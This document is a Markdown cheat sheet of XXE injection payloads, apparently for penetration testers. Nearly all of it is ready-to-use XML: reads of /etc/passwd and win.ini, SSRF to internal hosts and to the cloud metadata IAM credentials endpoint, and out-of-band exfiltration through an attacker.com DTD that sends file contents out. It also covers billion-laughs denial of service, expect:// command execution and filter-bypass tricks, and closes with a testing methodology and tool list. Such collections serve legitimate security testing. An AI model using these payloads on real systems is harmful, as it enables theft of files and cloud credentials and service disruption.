# XXE (XML External Entity) Patterns

## Basic XXE - File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

## Basic XXE - Windows
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>
```

---

## SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
]>
<foo>&xxe;</foo>
```

## Cloud Metadata via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<foo>&xxe;</foo>
```

---

## Blind XXE - Out-of-Band (OOB)

### External DTD
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>&send;</foo>
```

### evil.dtd on attacker server
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
```

---

## Error-Based XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  &error;
]>
```

---

## Parameter Entities
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/payload.dtd">
  %xxe;
]>
```

---

## Billion Laughs (DoS)
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
```

---

## XXE in Different Contexts

### SVG
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

### SOAP
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>
```

### RSS
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
  </channel>
</rss>
```

---

## File Upload XXE

### DOCX (word/document.xml)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>
```

### XLSX (xl/workbook.xml)
Same structure as DOCX

### PPTX (ppt/presentation.xml)
Same structure as DOCX

---

## Protocol Handlers
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "http://attacker.com/">
<!ENTITY xxe SYSTEM "https://attacker.com/">
<!ENTITY xxe SYSTEM "ftp://attacker.com/">
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "gopher://attacker.com/_GET%20/">
```

---

## Bypass Filters

### Different Encodings
```xml
<?xml version="1.0" encoding="UTF-16"?>
<?xml version="1.0" encoding="UTF-7"?>
```

### CDATA Sections
```xml
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://attacker.com/combine.dtd">
  %dtd;
]>
```

### XInclude
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## Testing Methodology

1. **Identify XML parsing** - File uploads, SOAP, API requests
2. **Test basic XXE** - `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
3. **Test external DTD** - If basic fails, try OOB
4. **Test parameter entities** - `<!ENTITY % xxe ...>`
5. **Try different protocols** - file, http, php, expect
6. **Try different encodings** - UTF-16, UTF-7
7. **Try XInclude** - If DOCTYPE blocked

## Tools
- https://github.com/enjoiz/XXEinjector
- Burp Suite XXE Scanner
- Interactsh / Burp Collaborator

## References
- https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- https://portswigger.net/web-security/xxe
